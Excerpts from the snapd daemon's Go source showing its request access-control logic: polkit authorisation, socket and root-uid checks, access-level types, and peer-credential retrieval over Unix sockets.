[access.go: polkit/ucred/socket gate]
    50	func checkPolkitActionImpl(r *http.Request, ucred *ucrednet, action string) *apiError {
    51		var flags polkit.CheckFlags
    52		allowHeader := r.Header.Get(client.AllowInteractionHeader)
    53		if allowHeader != "" {
    54			if allow, err := strconv.ParseBool(allowHeader); err != nil {
    55				logger.Noticef("error parsing %s header: %s", client.AllowInteractionHeader, err)
    56			} else if allow {
    57				flags |= polkit.CheckAllowInteraction
    58			}
    59		}
    60		// Pass both pid and uid from the peer ucred to avoid pid race
    61		switch authorized, err := polkitCheckAuthorization(ucred.Pid, ucred.Uid, action, nil, flags); err {
    62		case nil:
    63			if authorized {
    64				// polkit says user is authorised
    65				return nil
    66			}
    67		case polkit.ErrDismissed:
    68			return AuthCancelled("cancelled")
    69		default:
    70			logger.Noticef("polkit error: %s", err)
    71		}
    72		return Unauthorized("access denied")
   133	func checkAccess(d *Daemon, r *http.Request, ucred *ucrednet, user *auth.UserState, opts accessOptions) *apiError {
   134		if err := opts.validate(); err != nil {
   135			return InternalError(err.Error())
   136		}
   137	
   138		if rspe := requireSockets(ucred, opts.Sockets); rspe != nil {
   139			return rspe
   140		}
   141	
   142		if opts.InterfaceAccess != nil {
   143			// No interface checks are made if request is coming from snapd.socket
   144			// to account for the snapd-control interface.
   145			rspe := requireInterfaceApiAccess(d, r, ucred, *opts.InterfaceAccess)
   146			if rspe != nil {
   147				return rspe
   148			}
   149		}
   150	
   151		if opts.AccessLevel == accessLevelOpen {
   152			return nil
   153		}
   154	
   155		if opts.AccessLevel == accessLevelAuthenticated && user != nil {
   156			// user != nil means we have an authenticated user
   157			return nil
   158		}
   159	
   160		if ucred.Uid == 0 {
   161			return nil
   162		}
   163	
   164		// We check polkit last because it may result in the user
   165		// being prompted for authorisation. This should be avoided if
   166		// access is otherwise granted.
   167		if opts.PolkitAction != "" {
   168			return checkPolkitAction(r, ucred, opts.PolkitAction)
   169		}
   170	
   171		// XXX: when to 403 vs 401?
   172		if opts.AccessLevel == accessLevelAuthenticated || opts.InterfaceAccess != nil {
   173			return Unauthorized("access denied")
   174		}
   175		return Forbidden("access denied")
   178	// openAccess allows requests without authentication, provided they
   179	// have peer credentials and were not received on snapd-snap.socket
   180	type openAccess struct{}
   181	
   182	func (ac openAccess) CheckAccess(d *Daemon, r *http.Request, ucred *ucrednet, user *auth.UserState) *apiError {
   183		opts := accessOptions{
   184			AccessLevel: accessLevelOpen,
   185			Sockets:     []string{dirs.SnapdSocket},
   186		}
   187		return checkAccess(d, r, ucred, user, opts)
   188	}
   189	
   190	// authenticatedAccess allows requests from authenticated users,
   191	// provided they were not received on snapd-snap.socket
   192	//
   193	// A user is considered authenticated if they provide a macaroon, are
   194	// the root user according to peer credentials, or granted access by
   195	// Polkit.
   196	type authenticatedAccess struct {
   197		// Polkit is an optional polkit action to check as fallback
   198		// if the user is not root or does not provide a macaroon.
   199		//
   200		// Note: The specified polkit action must require auth_admin
   201		// to avoid compromising security.
   202		Polkit string
   203	}
   204	
   205	func (ac authenticatedAccess) CheckAccess(d *Daemon, r *http.Request, ucred *ucrednet, user *auth.UserState) *apiError {
   206		opts := accessOptions{
   207			AccessLevel:  accessLevelAuthenticated,
   208			Sockets:      []string{dirs.SnapdSocket},
   209			PolkitAction: ac.Polkit,
   210		}
   211		return checkAccess(d, r, ucred, user, opts)
   212	}
   213	
   214	// rootAccess allows requests from the root uid, provided they
   215	// were not received on snapd-snap.socket
   216	type rootAccess struct{}
   217	
   218	func (ac rootAccess) CheckAccess(d *Daemon, r *http.Request, ucred *ucrednet, user *auth.UserState) *apiError {
   219		opts := accessOptions{
   220			AccessLevel: accessLevelRoot,
   221			Sockets:     []string{dirs.SnapdSocket},
   222		}
   223		return checkAccess(d, r, ucred, user, opts)
   224	}
   225	
   226	// snapAccess allows requests from the snapd-snap.socket only.
   227	type snapAccess struct{}
   228	
   229	func (ac snapAccess) CheckAccess(d *Daemon, r *http.Request, ucred *ucrednet, user *auth.UserState) *apiError {
   230		opts := accessOptions{
   231			AccessLevel: accessLevelOpen,
   232			Sockets:     []string{dirs.SnapSocket},
   233		}
   234		return checkAccess(d, r, ucred, user, opts)
   235	}
   484	// isRequestFromSnapCmd checks that the request is coming from snap command.
   485	//
   486	// It checks that the request process "/proc/PID/exe" points to one of the
   487	// known locations of the snap command. This not a security-oriented check.
   488	func isRequestFromSnapCmd(r *http.Request) (bool, error) {
   489		ucred, err := ucrednetGet(r.RemoteAddr)
   490		if err != nil {
   491			return false, err
   492		}
   493		exe, err := osReadlink(fmt.Sprintf("/proc/%d/exe", ucred.Pid))
   494		if err != nil {
   495			return false, err
   496		}
   497	
   498		// SNAP_REEXEC=0
   499		if exe == filepath.Join(dirs.GlobalRootDir, "/usr/bin/snap") {
   500			return true, nil
   501		}
   502	
   503		// Check if re-exec in snapd
   504		path := filepath.Join(dirs.SnapMountDir, "snapd/*/usr/bin/snap")
   505		if matched, err := filepath.Match(path, exe); err != nil {
   506			return false, err
   507		} else if matched {
   508			return true, nil
   509		}
   510	
   511		// Check if re-exec in core
   512		path = filepath.Join(dirs.SnapMountDir, "core/*/usr/bin/snap")
   513		if matched, err := filepath.Match(path, exe); err != nil {
   514			return false, err
   515		} else if matched {
   516			return true, nil
   517		}
   518	
   519		return false, nil
   520	}

[ucrednet.go: peer credentials]
   147	var getUcred = sys.GetsockoptUcred
   148	
   149	func (wl *ucrednetListener) Accept() (net.Conn, error) {
   150		con, err := wl.Listener.Accept()
   151		if err != nil {
   152			return nil, err
   153		}
   154	
   155		var unet *ucrednet
   156		if ucon, ok := con.(*net.UnixConn); ok {
   157			syscallConn, err := ucon.SyscallConn()
   158			if err != nil {
   159				return nil, err
   160			}
   161	
   162			var ucred *sys.Ucred
   163			scErr := syscallConn.Control(func(fd uintptr) {
   164				ucred, err = getUcred(int(fd), sys.SOL_SOCKET, sys.SO_PEERCRED)
   165			})
   166			if scErr != nil {
   167				return nil, scErr
   168			}
   169			if err != nil {
   170				return nil, err
   171			}
   172	
   173			unet = &ucrednet{
   174				Pid:    ucred.Pid,
   175				Uid:    ucred.Uid,
   176				Socket: ucon.LocalAddr().String(),
   177			}
   178		}
   179	
   180		return &ucrednetConn{con, unet}, nil

